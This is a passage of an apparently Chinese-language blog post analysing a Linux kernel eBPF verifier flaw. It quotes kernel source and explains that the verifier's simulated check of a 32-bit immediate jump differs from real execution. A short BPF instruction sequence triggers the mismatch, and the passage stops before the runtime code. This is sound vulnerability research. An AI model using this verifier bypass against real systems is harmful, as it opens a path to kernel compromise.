(attr-&gt;insn_cnt &gt;= BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == BPF_PROG_TYPE_KPROBE &amp;&amp;</span><br><span class="line">      attr-&gt;kern_version != LINUX_VERSION_CODE)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type != BPF_PROG_TYPE_SOCKET_FILTER &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* plain bpf_prog allocation */</span></span><br><span class="line">  prog = bpf_prog_alloc(bpf_prog_size(attr-&gt;insn_cnt), GFP_USER);</span><br><span class="line">  <span class="keyword">if</span> (!prog)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_charge_memlock(prog);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_prog_nouncharge;</span><br><span class="line"></span><br><span class="line">  prog-&gt;len = attr-&gt;insn_cnt;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(prog-&gt;insns, u64_to_ptr(attr-&gt;insns),</span><br><span class="line">                     prog-&gt;len * <span class="keyword">sizeof</span>(struct bpf_insn)) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  prog-&gt;orig_prog = <span class="literal">NULL</span>;</span><br><span class="line">  prog-&gt;jited = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;prog-&gt;aux-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  prog-&gt;gpl_compatible = is_gpl ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">  err = find_prog_type(type, prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* run eBPF verifier */</span></span><br><span class="line">  err = bpf_check(&amp;prog, attr);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">  fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">  err = bpf_prog_select_runtime(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_new_fd(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* failed to allocate fd */</span></span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_used_maps:</span><br><span class="line">  free_used_maps(prog-&gt;aux);</span><br><span class="line">  free_prog:</span><br><span class="line">  bpf_prog_uncharge_memlock(prog);</span><br><span class="line">  free_prog_nouncharge:</span><br><span class="line">  bpf_prog_free(prog);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在19行对ebpf license进行验证是否为GPL证书的一种，在21行检验了传入代码的长度，然后通过<code>find_prog_type</code>函数判断过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最后进入<code>bpf_check</code>函数进行进一步验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">  <span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span></span><br><span class="line"><span class="comment"> * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!env)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">  mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">    <span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment"> * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    log_level = attr-&gt;log_level;</span><br><span class="line">    log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">    log_size = attr-&gt;log_size;</span><br><span class="line">    log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = -EINVAL;</span><br><span class="line">    <span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">    <span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">        log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">    ret = -ENOMEM;</span><br><span class="line">    log_buf = vmalloc(log_size);</span><br><span class="line">    <span class="keyword">if</span> (!log_buf)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log_level = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = replace_map_fd_with_map_ptr(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">                                 GFP_USER);</span><br><span class="line">  ret = -ENOMEM;</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  ret = check_cfg(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">  ret = do_check(env);</span><br><span class="line"></span><br><span class="line">  skip_full_check:</span><br><span class="line">  <span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">  free_states(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">    ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">    BUG_ON(log_len &gt;= log_size);</span><br><span class="line">    <span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">    ret = -ENOSPC;</span><br><span class="line">    <span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    ret = -EFAULT;</span><br><span class="line">    <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">    <span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">                                              <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">                                              GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">      ret = -ENOMEM;</span><br><span class="line">      <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">           <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment"> * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    convert_pseudo_ld_imm64(env);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_log_buf:</span><br><span class="line">  <span class="keyword">if</span> (log_level)</span><br><span class="line">    vfree(log_buf);</span><br><span class="line">  free_env:</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">    <span class="comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment"> * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    release_maps(env);</span><br><span class="line">  *prog = env-&gt;prog;</span><br><span class="line">  kfree(env);</span><br><span class="line">  mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是使用<code>check_cfg</code>函数借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，避免造成无法预期的风险。最后则是使用<code>do_check</code>函数模拟执行一次注入代码，会将注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，会模拟每条指令的执行，包括堆栈、寄存器、访问内存、调用函数等。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里的漏洞发生在<code>do_check</code>函数和最后真正运行的<code>__bpf_prog_run</code>翻译结果不一致导致的。这里用如下代码来演示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure><p>首先看一下<code>do_check</code>函数中处理的事情：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init_reg_state(regs);</span><br><span class="line">insn_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">insn_idx, insn_cnt);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insn = &amp;insns[insn_idx]; </span><br><span class="line"><span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在一个for死循环，最后会返回<code>BPF_CLASS</code>获得的指令操作码类型。</p><p>第一条指令是<code>BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)</code>，BPF_MOV指令属于ALU大类中，在检测到指令类型是ALU，进入如下分支，调用<code>check_alu_op()</code>函数继续判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;</span><br><span class="line">err = check_alu_op(env, insn);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>check_alu_op()</code>函数，上面这条代码的指令操作码为BPF_MOV，进入如下分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">      <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment"> * copy register state to dest reg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">          verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                  insn-&gt;src_reg);</span><br><span class="line">          <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">        regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//BPF_K</span></span><br><span class="line">      <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment"> * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">      regs[insn-&gt;dst_reg].type = CONST_IMM; </span><br><span class="line">      regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里最后是将指令的立即数保存到了reg_state结构体中的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">    <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment"> *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，这里的imm也是有符号整数，和<code>bpf_insn</code>结构体中的imm类型一致。<br>检查第二条指令<code>BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)</code>，这是一条JMP指令，在<code>do_check</code>函数中会进入如下分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">  u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = check_call(env, insn-&gt;imm);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment"> * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment"> * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment"> * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment"> * something into it earlier</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    process_bpf_exit:</span><br><span class="line">    insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      do_print_state = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的else语句也就是JNE所进入的分支，所以会进一步进入<code>check_cond_jmp_op</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">    <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment"> * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    *insn_idx += insn-&gt;off;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment"> * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment"> * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数内部存在这样一条if语句，由前面提到了在<code>reg_state</code>结构体中的imm和<code>insn</code>中的imm都是int类型，并且<code>reg_state</code>结构体中的imm是由<code>insn</code>中直接赋值过去的，所以这个条件会恒等。所以当操作码为<code>BPF_JNE</code>时，永远都不会跳转。</p><p>上面是模拟执行的情况，那么下面看看真实执行情况是什么样子的，首先真实执行情况的函数为<code>__bpf_prog_run</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 